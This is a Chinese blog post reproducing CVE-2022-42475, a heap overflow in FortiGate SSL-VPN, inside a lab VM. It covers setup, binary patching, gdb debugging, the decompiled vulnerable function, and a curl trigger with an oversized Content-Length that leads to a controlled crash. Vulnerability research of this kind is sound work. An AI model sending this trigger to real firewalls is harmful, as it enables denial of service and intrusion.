<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="https://augu5tu.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content="飞光之下，对结构与失序的片刻凝视，录于此间：对若干封闭系统的交互逻辑作审慎考察；观测特定输入变异对系统状态产生的效应；以及某些非预期行为的溯源与校正。&lt;br&gt;
另，偶于叙事构造中暂留。&lt;br&gt;"><meta charset="UTF-8"><title>CVE-2022-42475 复现 总结 | Augu5tu-飞光</title>
<link href="https://augu5tu.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://augu5tu.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"></script>
<script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-DLNENTJ4LP"></script>
<script>
	window.dataLayer = window.dataLayer || [];
	function gtag() {
		dataLayer.push(arguments);
	}
	gtag('js', new Date());
	gtag('config', 'G-DLNENTJ4LP');
</script>

<link rel="canonical" href="https://augu5tu.github.io/post/cve-2022-42475-reproduction-summary/" />
</head>
<body>
<div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
<noscript><p class="warn" >本页面需要浏览器支持（启用）JavaScript</p></noscript><div class="header"><div class="logo_title"><div class="title animated fadeInDown"><a href="https://augu5tu.github.io"><img alt="logo" style="display:inline-block;" src="https://augu5tu.github.io/images/avatar.png"/></a><h1 title="Augu5tu-飞光" class="weaklink"><a  href="/">Augu5tu-飞光</a></h1>

<div class="navbar weaklink">
<div class="normal_nav">
<div class="bitcron_nav_container"><div class="bitcron_nav"><div class="bitcron_nav"><div style="display:flex;justify-content:center;"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li></ul></nav>
<div style="float:right;margin-top:1em"><form id="gridea-search-form" data-update="1578893743252" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="Search..."></form></div><div style="margin-left:0.5em;margin-top:1.2em"><input id="switch_default" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
<div class="clear clear_nav_inline_end"></div></div></div><div class="clear clear_nav_end"></div></div></div><div class="hamberger" href="javascript:void(0)" onclick="btn_toggle();"><i class="iconfont icon-category"></i></div></div></div></div>
<div id="hn" class="no-js hidden_nav animated fadeInDown"><div class="bitcron_nav_container"><div class="bitcron_nav"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li></ul><div class="clear clear_nav_inline_end"></div></nav></div><div class="clear clear_nav_end"></div></div>
<div style="display:flex;justify-content:center;inline-block;text-align:center;margin-top:7%"><div><form id="gridea-search-form" data-update="1748232441122" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q"  placeholder="Search..." /></form></div><div style="margin-left:0.5em"><input id="switch_default_h" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
</div></div>
<script>function enableDarkmode(){document.body.classList.add("darkmode"),document.getElementById("switch_default").checked=1,document.getElementById("switch_default_h").checked=1}function removeDarkmode(){document.body.classList.remove("darkmode"),document.getElementById("switch_default").checked=0,document.getElementById("switch_default_h").checked=0}function getCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):null}cookie=getCookie("darkmode"),"enable"==cookie&&enableDarkmode(),window.matchMedia("(prefers-color-scheme: dark)").matches&&"disable"!==cookie&&(enableDarkmode(),document.cookie="darkmode=enable; path=/");var mobileBtn=function(){1==document.getElementById("switch_default").checked?(enableDarkmode(),document.cookie="darkmode=enable; path=/"):(removeDarkmode(),document.cookie="darkmode=disable; path=/")};</script>

<div class="main"><div class="main-inner"><div class="content">
<article class="post">
<h2 class="post_title sm_margin"><a>CVE-2022-42475 复现 总结</a></h2>
<script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2024-03-25</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px">	<a href="https://augu5tu.github.io/tag/pYJe21pU8F/" class="tag">技术</a> | 	<a href="https://augu5tu.github.io/tag/Xmo6nLOEXdk/" class="tag">二进制</a> | 	<a href="https://augu5tu.github.io/tag/MmHC2N6JB_K/" class="tag">防火墙</a> | 	<a href="https://augu5tu.github.io/tag/zhuPkpOf2Lr/" class="tag">漏洞复现</a></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">6538字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">29 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
</section>

<img class="featureImg" alt="featureimg" src="https://raw.githubusercontent.com/Augu5tu/picture/img/cve-2022-42475-cover.png" referrerpolicy="no-referrer">

<div style="display:flex">
<div class="md_block" id="md_block">
<div class="round-shape-one"></div>
<pre><code>经历了快两三个月，终于将这个漏洞复现完成，中间因为无法联调的问题浪费了大部分时间，所幸拨得云开见月明，总结一下，希望给后面尝试复现这个漏洞的人一些帮助。
</code></pre>
<h1 id="搭载运行环境">搭载运行环境</h1>
<p>​	第一步应该是下载FortiGate的虚拟机镜像，网上大部分教程都是7.2.4的版本，官网在不断地更新固件，这个版本可能不太好下载了，这里附一个<a href="https://pan.baidu.com/s/1F13NLpdIvjyJko1_GqV-kQ?pwd=gyd7">7.2.4版本的ova</a>，双击导入即可</p>
<p>​	导入后，网上许多教程建议将虚拟网卡绑到nat，事实上完全可以省去这一步骤，网络适配器可以选择性移除到只留一个（不移除也没有问题）</p>
<p>​	启动后，使用admin+空密码登录，然后设置新密码</p>
<p>​	由于上一步我们省去了绑定的步骤，所以这里需要运行一条命令获取虚拟机的IP地址，事实上，FortiGate防火墙上可用的命令并不多，而且和我们通常熟悉的命令并不相同，这也为我们后面的工作造成了一些障碍，言归正传，输入命令<code>get system interface physical</code>，获取IP</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325165300930.png" alt="image-20240325165300930" loading="lazy"></figure>
<p>在浏览器中输入IP地址进行访问，找到 VPN/SSL-VPN Settings，设置好 SSL-VPN 相关的内容</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325165923256.png" alt="image-20240325165923256" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325170105046.png" alt="image-20240325170105046" loading="lazy"></figure>
<p>如果有问题，可以访问<a href="https://i3r0nya.cn/wiki/note/reverse/cve-2022-42475/">这篇博客</a>的配置部分，相当详细</p>
<p>之后访问 sslvpn 的端口，就会出现 vpn 登录页面，我上面设置的端口是10443，ip是192.168.150.9，所以我应该访问192.168.150.9:10443，如果你能正确访问，那么下面的部分可以直接跳过</p>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325170424792.png" alt="image-20240325170424792" loading="lazy"></figure>
<p>但或许你会看到如下界面，请别紧张，有可能是你的配置错误，可以按照上面的步骤仔细检查，也有可能是tls版本的问题，在FortiGate官方文档中，写明支持tls 1.3版本，但实际测试中没有相关选项，只有tls 1.0</p>
<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203841777.png" alt="image-20231221203841777" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203820776.png" alt="image-20231221203820776" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203447059.png" alt="image-20231221203447059" loading="lazy"></figure>
<p>这里我尝试使用edge浏览器的IE兼容模式，也不能连接，直到将tls 1.0选项勾选才能看到web界面</p>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20231221204134910.png" alt="image-20231221204134910" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203957389.png" alt="image-20231221203957389" loading="lazy"></figure>
<p>点击转到此网页</p>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221204009531.png" alt="image-20231221204009531" loading="lazy"></figure>
<p>环境搭建就此完成</p>
<h1 id="搭建调试和漏洞环境">搭建调试和漏洞环境</h1>
<p>在7.2.3中，我们所想复现的这个漏洞已经被修复，所以需要通过二进制 patch，去掉漏洞的补丁。</p>
<h2 id="提取二进制">提取二进制</h2>
<p>二进制程序位于虚拟机磁盘文件中，使用 vmware workstation （Linux 虚拟机）挂载 fortinet 虚拟机的磁盘文件，在虚拟机中挂载分区。</p>
<p>这里我展示一下如何操作</p>
<p>首先，VMware中找到FortiGate虚拟机（先关机），点击<code>编辑虚拟机设置</code>，找到较小的硬盘，复制文件地址</p>
<img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325171416114.png" alt="image-20240325171416114" style="zoom:80%;" />
<p>然后使用另一台虚拟机（最好选择一台不是调试用的，这段操作你可能要重复很多次，建议一台常用虚拟机用于调试，一台用于完成文件操作，后一台在FortiGate虚拟机开启时关闭，这样就避免了频繁在虚拟机配置页面卸载装载硬盘），如法炮制，同样的界面，选择添加-&gt;硬盘-&gt;下一步-&gt;使用现有虚拟磁盘-&gt;将刚刚复制的磁盘地址粘贴到地址框内-&gt;点击完成</p>
<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325171555293.png" alt="image-20240325171555293" loading="lazy"></figure>
<p>这时候再开机，可以看到文件系统中存在FORTIOS 分区</p>
<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325172208070.png" alt="image-20240325172208070" loading="lazy"></figure>
<p>​	主要业务二进制位于 FORTIOS 分区的 rootfs.gz 打包文件中，如果你使用的是高版本Ubuntu系统，这里可以直接使用图形化界面完成解压操作，即右键-&gt;提取到，选择一个易于记忆的位置存放文件，如果不是，使用 gzip + cpio 解压后会出现结果 .tar 文件，使用 rootfs 下的 xz 和 ftar 解压这些文件。</p>
<pre><code>sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
sudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
sudo chroot . /sbin/ftar -xf /migadmin.tar
sudo chroot . /sbin/xz --check=sha256 -d /usr.tar.xz
sudo chroot . /sbin/ftar -xf /usr.tar
</code></pre>
<h3 id="搭建gdb调试环境">搭建GDB调试环境</h3>
<p>​	登录虚拟机console后，拿到的是一个受限的命令行界面，无法执行 shell 命令，我们需要通过 patch 文件系统和二进制来获取 shell 执行环境。</p>
<p>这里可以直接看<a href="https://forum.butian.net/share/2166">这篇博客</a>，我不想写了</p>
<p>在patch完，重打包， GDB 调试 Fortios 系统内核的步骤中，你可能并不能像网上的许多博客一样可以成功下端点修改返回值，这里推荐看我的<a href="https://blog.augustu.top/post/vmware-debug/">上一篇博客</a></p>
<p>在启动以后，执行<code>diagnose hardware smartctl</code>命令，激活后门以后，执行<code>get system interface physical</code>找到FortiGate的ip</p>
<p>在 FortiGate 上开启一个调试端口，方便本地 gdb 远程连接到服务器上进行调试</p>
<p>使用 <code>busybox ps -a</code> 命令查看所有的进程 pid，确定 sslvpn 的 pid，接着执行命令附加调试</p>
<pre><code class="language-bash">/ # busybox ps -a |grep sslvpn
 2507 0         0:00 /bin/sslvpnd
 2719 0         0:00 grep sslvpn
/ # gdbserver :80 --attach 2507
Attached; pid = 2507
Listening on port 80
</code></pre>
<p>再在终端中开启GDB远程调试：<code>gdb-peda$ target remote 192.168.150.131:80</code></p>
<h1 id="漏洞分析">漏洞分析</h1>
<h2 id="漏洞探寻">漏洞探寻</h2>
<p>漏洞位于如下函数处：</p>
<pre><code class="language-c">// 这个函数负责从 POST 请求体中读取输入，其基本逻辑：
// 首先获取到用户提交的 Content-Length 值，传入 pool_alloc 函数中分配内存空间，之后使用 memcpy 将用户数据拷贝到刚刚分配的内存中。
__int64 __fastcall sslvpn_read_post_data_cb(_QWORD *a1)
{
  __int64 *v1; // r12
  sslvpn_context *v2; // rax
  __int64 v3; // rcx
  int v4; // r8d
  int v5; // r9d
  sslvpn_context *ctx; // rbx
  __int64 v7; // rax
  size_t v8; // r12
  signed __int64 sock_buffer; // rdi
  signed __int64 content_length; // rax
  signed __int64 v11; // r12
  char *v13; // rax

  v1 = (__int64 *)a1[92];
  v2 = (sslvpn_context *)sub_181BDC0(a1[83]);
  ctx = v2;
  if ( v2-&gt;content || (v13 = pool_alloc(*v1, v2-&gt;content_length + 1), (ctx-&gt;content = (uint64_t)v13) != 0) )
  {
    v7 = sub_16E6130((__int64)v1, (__int64)&amp;ctx[1], 8190LL, v3, v4, v5);
    v8 = v7;
    if ( v7 )
    {
      if ( v7 &lt; 0 )
      {
        if ( (unsigned int)sub_16DCA50(a1[77]) - 1 &lt;= 4 )
          return 0LL;
      }
      else
      {
        sock_buffer = ctx-&gt;sock_buffer;
        content_length = ctx-&gt;content_length;
        if ( (__int64)(sock_buffer + v8) &gt; content_length )
          v8 = ctx-&gt;content_length - sock_buffer;
        if ( sock_buffer &lt; content_length )
        {
          memcpy((void *)(ctx-&gt;content + sock_buffer), &amp;ctx[1], v8);
          sock_buffer = ctx-&gt;sock_buffer;
          content_length = ctx-&gt;content_length;
        }
        v11 = sock_buffer + v8;
        ctx-&gt;sock_buffer = v11;
        if ( v11 &lt; content_length )
          return 0LL;
      }
    }
    return 2LL;
  }
  return 7LL;
}
</code></pre>
<p>最主要的是<code>v13 = pool_alloc(*v1, v2-&gt;content_length + 1</code>这里</p>
<p>这里我使用的是7.2.4版本的FortiGate，此版本漏洞已经被修复完毕</p>
<p>调用``pool_alloc`函数处汇编代码如下：</p>
<pre><code class="language-assembly">.text:0000000001811128 loc_1811128:                            ; CODE XREF: sslvpn_read_post_data_cb+29↑j
.text:0000000001811128                 mov     rax, [rax+18h]
.text:000000000181112C                 mov     rdi, [r12]
.text:0000000001811130                 lea     rsi, [rax+1]
.text:0000000001811134                 call    pool_alloc
</code></pre>
<p>老版本此处调用代码如下：</p>
<pre><code class="language-assembly">mov     eax, [rax+18h] // DWORD(ctx-&gt;content_length)
mov     rdi, [r12]
lea     esi, [rax+1]  // DWORD(ctx-&gt;content_length) + 1
movsxd  rsi, esi
call    alloc
</code></pre>
<p>在老版本中，当CL值被存入eax寄存器时，因为eax寄存器最多只能存储32位，以及后面会对地址进行拓展+1的操作，所以会存在溢出可能性，举例：</p>
<p>当提供的 content_length 为 0x1b00000000 时，由于 <code>DWORD(ctx-&gt;content_length) = 0</code> ，因此实际申请内存为 1 字节，而下面做内存拷贝时取到的 content-length 为 0x1b00000000，从而导致<strong>堆溢出漏洞</strong>。</p>
<p>但因为使用的不是老版本固件，所以需要进行patch，具体方式参考<a href="https://forum.butian.net/share/2166">此文章</a></p>
<p>这里我使用的师兄patch后的版本</p>
<pre><code class="language-assembly">.text:0000000001811128 loc_1811128:                            ; CODE XREF: sslvpn_read_post_data_cb+29↑j
.text:0000000001811128                 jmp     short loc_1811174
.text:0000000001811128 ; ---------------------------------------------------------------------------
.text:000000000181112A                 align 4
.text:000000000181112C                 call    qword ptr [rax-6F6F6F70h]
.text:0000000001811132                 nop
.text:0000000001811133                 nop
.text:0000000001811134
.text:0000000001811134 loc_1811134:                            ; CODE XREF: sub_16E5DC0+21D↑j
.text:0000000001811134                                         ; sslvpn_read_post_data_cb+527↓j
.text:0000000001811134                 call    pool_alloc
......

.text:0000000001811174 loc_1811174:                            ; CODE XREF: sslvpn_read_post_data_cb:loc_1811128↑j
.text:0000000001811174                 mov     eax, [rax+18h]
.text:0000000001811177                 mov     rdi, [r12]
.text:000000000181117B                 jmp     loc_1811406
......

.text:0000000001811406 loc_1811406:                            ; CODE XREF: sslvpn_read_post_data_cb+FB↑j
.text:0000000001811406                 lea     esi, [rax+1]
.text:0000000001811409                 jmp     loc_18115A4
......


.text:00000000018115A4 loc_18115A4:                            ; CODE XREF: sslvpn_read_post_data_cb+389↑j
.text:00000000018115A4                 movsxd  rsi, esi
.text:00000000018115A7                 jmp     loc_1811134
......

.text:0000000001811134 loc_1811134:                            ; CODE XREF: sub_16E5DC0+21D↑j
.text:0000000001811134                                         ; sslvpn_read_post_data_cb+527↓j
.text:0000000001811134                 call    pool_alloc
......
</code></pre>
<pre><code>curl --noproxy '*' --data-binary @payload -H 'Content-Length: 115964116992' -vik 'https://192.168.150.131:10443/remote/logincheck?AAAA=BBBB'
</code></pre>
<p>这里存在整数溢出。那么我们可以构造特殊的 CL 值，比如 0x1b00000000，经过运算拓展之后会变成 0x1，在运行到<code>pool_alloc</code>函数的时候（注意，此函数被调用了很多次，建议运行到漏洞函数以后再在<code>memset</code>函数处下断点观察）分配内存如下：</p>
<pre><code class="language-bash">Breakpoint 3, 0x00000000016d1bad in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*RAX  0x7fc0cc200448 ◂— 0x0
*RBX  0x8
 RCX  0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 —▸ 0x7fc0cc0d64f0 ◂— 0x7fc0cc0b7a18
*RDX  0x1
*RDI  0x7fc0cc200440 ◂— 0x0
*RSI  0x0
 R8   0x7fc0cc200440 ◂— 0x0
 R9   0x0
 R10  0x0
 R11  0x246
 R12  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
*R13  0x1
 R14  0x0
 R15  0x7fc0cc0d64f0 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 ◂— 0x7fc0cc0d64f0
*RBP  0x7ffd87902f00 —▸ 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
*RSP  0x7ffd87902ee0 ◂— 0x0
*RIP  0x16d1bad ◂— call 0x43c500
─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x16d1bad    call   memset@plt                      &lt;memset@plt&gt;
        s: 0x7fc0cc200440 ◂— 0x0
        c: 0x0
        n: 0x1
 
   0x16d1bb2    mov    r8, rax
   0x16d1bb5    add    rsp, 8
   0x16d1bb9    mov    rax, r8
   0x16d1bbc    pop    rbx
   0x16d1bbd    pop    r12
   0x16d1bbf    pop    r13
   0x16d1bc1    pop    rbp
   0x16d1bc2    ret    
 
   0x16d1bc3    nop    dword ptr [rax + rax]
   0x16d1bc8    mov    eax, dword ptr [rip + 0x940f5b6]
───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902ee0 ◂— 0x0
01:0008│-018 0x7ffd87902ee8 —▸ 0x7fc0cc0fd018 —▸ 0x7fc0ccc54ae8 —▸ 0x7fc0cc0d62f0 —▸ 0x7fc0cc1fe018 ◂— ...
02:0010│-010 0x7ffd87902ef0 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
03:0018│-008 0x7ffd87902ef8 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
04:0020│ rbp 0x7ffd87902f00 —▸ 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
05:0028│+008 0x7ffd87902f08 —▸ 0x1811139 ◂— mov qword ptr [rbx + 8], rax
06:0030│+010 0x7ffd87902f10 ◂— 0x0
07:0038│+018 0x7ffd87902f18 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x16d1bad
   1        0x1811139
   2        0x180ab0d
   3        0x180c1c0
   4        0x180c29e
   5        0x180c7b1
   6        0x180da5c
   7        0x180ede2
</code></pre>
<p>缓冲区是位于 heap 的一块较小内存，而 size 已经变成 0x1。</p>
<p>这样 <code>pool_alloc</code> 返回了一块较小的堆内存，假设此时我们在 POST 请求体中构造了超长的数据，那么在后续的 <code>memcpy</code> 阶段就会导致堆内存溢出。</p>
<pre><code class="language-bash">Breakpoint 4, 0x0000000001811162 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*RAX  0x1b00000000
*RBX  0x7fc0cc0fd018 —▸ 0x7fc0ccc54ae8 —▸ 0x7fc0cc0d62f0 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 ◂— ...
*RCX  0x1ffe
*RDX  0x1ffe
 RDI  0x7fc0cc200440 ◂— 0x0
*RSI  0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
*R8   0x16
*R9   0x7fc0cc0fd080 ◂— 0x4141414141414141 ('AAAAAAAA')
*R10  0x7fc0cc0bdfb0 ◂— 0x0
*R11  0x7fc0cc0ff016 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*R12  0x1ffe
*R13  0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 —▸ 0x7fc0cc0b7c00 ◂— ...
*R14  0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
 R15  0x7fc0cc0d64f0 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 ◂— 0x7fc0cc0d64f0
*RBP  0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 —▸ 0x7ffd87905120 ◂— ...
*RSP  0x7ffd87902f10 ◂— 0x0
*RIP  0x1811162 ◂— call 0x4404a0
─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x1811162    call   memcpy@plt                      &lt;memcpy@plt&gt;
        dest: 0x7fc0cc200440 ◂— 0x0
        src: 0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
        n: 0x1ffe
 
   0x1811167    mov    rdi, qword ptr [rbx + 0x10]
   0x181116b    mov    rax, qword ptr [rbx + 0x18]
   0x181116f    jmp    0x18110e7                     &lt;0x18110e7&gt;
 
   0x1811174    mov    eax, dword ptr [rax + 0x18]
   0x1811177    mov    rdi, qword ptr [r12]
   0x181117b    jmp    0x1811406                     &lt;0x1811406&gt;
 
   0x1811180    push   rbp
   0x1811181    mov    rbp, rsp
   0x1811184    push   r14
   0x1811186    push   r13
───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902f10 ◂— 0x0
01:0008│-018 0x7ffd87902f18 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
02:0010│-010 0x7ffd87902f20 —▸ 0x7fc0cc0b79b8 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
03:0018│-008 0x7ffd87902f28 ◂— 0x0
04:0020│ rbp 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 —▸ 0x7ffd87905120 ◂— ...
05:0028│+008 0x7ffd87902f38 —▸ 0x180ab0d ◂— mov rcx, qword ptr [rbp - 0x38]
06:0030│+010 0x7ffd87902f40 —▸ 0x7ffd87902f50 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
07:0038│+018 0x7ffd87902f48 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 —▸ 0x7fc0cc0d64f0 ◂— 0x7fc0cc0b7a18
─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x1811162
   1        0x180ab0d
   2        0x180c1c0
   3        0x180c29e
   4        0x180c7b1
   5        0x180da5c
   6        0x180ede2
   7         0x449eaf
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; 
</code></pre>
<p>但 函数 <code>sslvpn_read_post_data_cb</code> 是一个回调函数，用于处理通过 SSL VPN 接收到的 POST 请求数据。它不是一次性处理所有数据，而是被<strong>循环调用</strong>来读取和处理数据块，直到整个请求体被处理完毕或发生错误。</p>
<p>我们的 <code>payload</code> 非常大 (100000 字节)，远超单次读取的 8190 字节，所以 <code>sslvpn_read_post_data_cb</code> 被反复调用，每次处理一小块数据，直到所有数据都被（尝试）拷贝。</p>
<p>经过多次循环调用 <code>sslvpn_read_post_data_cb</code> 和 <code>memcpy</code>，堆内存已经被大量覆盖。</p>
<p>程序继续执行其他逻辑。</p>
<p>最终在 <code>0x16e3c27: movzx eax, byte ptr [r14 + 0x41]</code> 处崩溃。</p>
<pre><code class="language-bash">pwndbg&gt; 

Program received signal SIGSEGV, Segmentation fault.
0x00000000016e3c27 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────── RAX  0x7fc0cc200e28 ◂— 0x4141414141414141 ('AAAAAAAA')
 RBX  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
 RCX  0x68
 RDX  0x0
 RDI  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
 RSI  0x323e9c3 ◂— 'text/html; charset=utf-8'
 R8   0x0
 R9   0x0
 R10  0x7fc0d1adf020 (__strcasecmp_l_avx+4880) ◂— vpslldq xmm2, xmm2, 2
 R11  0x0
 R12  0x323e9c3 ◂— 'text/html; charset=utf-8'
 R13  0xaaf50e0 ◂— 'Fortinet_Factory'
 R14  0x4141414141414141 ('AAAAAAAA')
 R15  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
 RBP  0x7ffd87902ec0 —▸ 0x7ffd87902f10 —▸ 0x7ffd87902f70 —▸ 0x7ffd87902f90 —▸ 0x7ffd87902fe0 ◂— ...
 RSP  0x7ffd87902e80 —▸ 0x3685072 ◂— 'text/plain'
 RIP  0x16e3c27 ◂— movzx eax, byte ptr [r14 + 0x41]
